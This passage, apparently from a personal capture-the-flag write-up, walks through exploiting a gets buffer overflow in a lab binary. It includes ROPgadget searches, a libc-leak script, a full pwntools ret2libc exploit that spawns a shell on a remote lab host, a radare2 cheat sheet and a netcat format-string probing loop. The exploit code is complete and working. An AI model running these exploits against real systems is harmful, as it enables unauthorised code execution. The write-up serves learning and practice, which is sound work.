![picture 74](/assets/images/739cb0687105ab0374753bc3371bb28ac35f7bf439a8f9d7b6a563f01f56182d.png)  

There are no other functions of our interest.

Vulnerable function `gets` is vulnerable to buffer overflow and is located at `rbp-0x20`. As there are no other functions, we need to leak libc address which has system function in it. to actually leak that, we'd need to use another function, like `puts` for which the offset is known

![picture 75](/assets/images/e3779c65fe0dbecc322d588fa5fb019c3c0bdc403403346e51682019831a767b.png)  

As return to the main function will be necessary, we need gadgets to do that. I'll strictly be following Razvi in his video https://www.youtube.com/watch?v=TTCz3kMutSs&t=850s and use ROPgadget to search for them.
```
ROPgadget --binary ./pwn109.pwn109 --depth 12 > gadgets.txt
```

As 64-bit saves data to registers (first one is RDI), the Gadget should do exactly that.
E.g.,
```
0x00000000004012a3 : pop rdi ; ret
```

## Leaking the addresses from stack

This script prints the values of all three functions
```python
from pwn import *

context.binary = binary = ELF("./pwn109.pwn109",checksec=False)

pop_rdi_ret = p64(0x00000000004012a3)
ret = p64(0x000000000040101a)
plt_puts = p64(binary.plt.puts)
got_puts = p64(binary.got.puts)
got_gets = p64(binary.got.gets)
got_setvbuf = p64(binary.got.setvbuf)

payload = b"A"*0x20
payload += b"B"*0x8
# We need to define what to actually print. Mind that data is stored in RDI, then the GOT Address and plt PUTS at last
payload += pop_rdi_ret + got_puts + plt_puts
payload += pop_rdi_ret + got_gets + plt_puts
payload += pop_rdi_ret + got_setvbuf + plt_puts

p = process()
p.recvuntil(b"ahead")
p.recv()
p.sendline(payload)
out = p.recv().split(b"\n")

leaked_puts_address = u64(out[0].ljust(8, b"\x00"))
leaked_gets_address = u64(out[1].ljust(8, b"\x00"))
leaked_setvbuf_address = u64(out[2].ljust(8, b"\x00"))

print("Leaked PUTS Address: {}".format(str(hex(leaked_puts_address))))
print("Leaked GETS Address: {}".format(str(hex(leaked_gets_address))))
print("Leaked SETVBUF Address: {}".format(str(hex(leaked_setvbuf_address))))

#p.interactive()
```

```
luka@yurei:~/Desktop/thm/pwn109$ python3 pwn109.py 
[+] Starting local process '/home/luka/Desktop/thm/pwn109/pwn109.pwn109': pid 105549
Leaked PUTS Address: 0x7fee0cd3ced0
Leaked GETS Address: 0x7fee0cd3c5a0
Leaked SETVBUF Address: 0x7fee0cd3d670
```

If i check remotely, the end addresses of the last 3 nibbles are always the same.

![picture 76](/assets/images/78851e5717a3ad93450670f5ffbac5c5c21b7fc8a68bfdf86f9473b61174f877.png)  

We can determine which libc has been used, even online on like https://libc.tip or https://libc.nullbyte.cat which already displays offsets!

![picture 77](/assets/images/014a835c552cd9fb420471450a780bd2497e05a63047a7426220af5db73a0464.png)  

Final Exploit
```python
from pwn import *

context.binary = binary = ELF("./pwn109.pwn109",checksec=False)

pop_rdi_ret = p64(0x00000000004012a3)
ret = p64(0x000000000040101a)

main = p64(binary.symbols.main)
plt_puts = p64(binary.plt.puts)
got_puts = p64(binary.got.puts)
got_gets = p64(binary.got.gets)
got_setvbuf = p64(binary.got.setvbuf)

payload = b"A"*0x20
payload += b"B"*0x8
# We need to define what to actually print. Mind that data is stored in RDI, then the GOT Address and plt PUTS at last
payload += pop_rdi_ret + got_puts + plt_puts
payload += pop_rdi_ret + got_gets + plt_puts
payload += pop_rdi_ret + got_setvbuf + plt_puts
payload += main

p = process()
p=remote("10.10.178.191", 9009)
p.recvuntil(b"ahead")
p.recv()
p.sendline(payload)

out = p.recvall().split(b"\n")

# u64 does the opposite what p64 does. It unpacs from little endian 64bit
leaked_puts_address = u64(out[0].ljust(8, b"\x00"))
leaked_gets_address = u64(out[1].ljust(8, b"\x00"))
leaked_setvbuf_address = u64(out[2].ljust(8, b"\x00"))

print("Leaked PUTS Address: {}".format(str(hex(leaked_puts_address))))
print("Leaked GETS Address: {}".format(str(hex(leaked_gets_address))))
print("Leaked SETVBUF Address: {}".format(str(hex(leaked_setvbuf_address))))

# 2nd stage where we return to the main function, exploit gets once again and return to libc system to spawn a shell. Offsets below were gotten from libc.nullbyte.cat
'''
	system	0x04f550	-0x30c40
	gets	0x080190	0x0
	puts	0x080aa0	0x910
	setvbuf	0x0813d0	0x1240
	open	0x10fd10	0x8fb80
	read	0x110140	0x8ffb0
	write	0x110210	0x90080
	str_bin_sh	0x1b3e1a	0x133c8a
'''

payload = b"A"*0x20
payload += b"B"*0x8

# ubuntu needs ret!
payload += ret
payload += pop_rdi_ret + p64(leaked_gets_address + 0x133c8a)
payload += p64(leaked_gets_address - 0x30c40)

p.sendline(payload)
p.interactive()
```

# PWN110 - todo
I've decided to do PWN110 at some later time, as i've not felt ready to build my own ROP Chains ;)



# RADARE2 CheatSheet
```
# Start radare2
r2 -R stdin=payload -d -A ./babyecho

# disas
pdf @ main

# Set breakpoints, e.g., before and after the call
db 0x12312312

#prints stack at address
pxr @ 0xadresscomeshere

# Print section
pxr @ section..got.plt

#prints string at adress
ps @ 0xaddresscomeshere

#prints 30 bytes from rsp
pxr 30 @ rsp

#print registers
dr

#prints current section
iS.

#execution continue
dc

# Continue for 1 command
ds

-   `pxa @ rsp` - to show annotated hexdump
-   `pxw @ rsp` - to show hexadecimal words dump (32bit)
-   `pxq @ rsp` - to show hexadecimal quad-words dump (64bit)
-   `ad@r:SP` - to analyze the stack data
# Restart program
oo

# Display vaariables
avfd
.afvd local_4h
```

# Random Scripts
## Leak addresses - format string vuln 
```
for i in `seq 1 20`; do timeout 1 echo -e "%$i\$lX" | nc -q 1 10.10.42.49 9007 | grep "Your current streak:";done
```